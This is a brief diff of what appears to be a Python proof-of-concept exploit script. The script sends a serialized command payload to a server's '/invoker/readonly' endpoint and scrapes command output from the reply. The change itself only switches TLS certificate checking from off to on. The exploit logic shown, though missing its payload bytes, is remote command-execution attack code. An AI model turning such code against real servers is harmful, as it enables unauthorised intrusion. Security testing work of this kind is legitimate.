@@ -45,7 +45,7 @@ def poc(url):
             payload = binascii.unhexlify(start + build_command_hex(cmd) + payload_end)
             payload_url = "%s/invoker/readonly" % url
             try:
-                req = requests.post(payload_url, data=payload, verify=False, timeout=6,)
+                req = requests.post(payload_url, data=payload, verify=True, timeout=6,)
                 res = re.search(b'](.*?)RunCheckConfig', req.content, re.DOTALL)
                 if res:
                     ooxx = (res.group(1)).decode('utf-8').strip('\r')
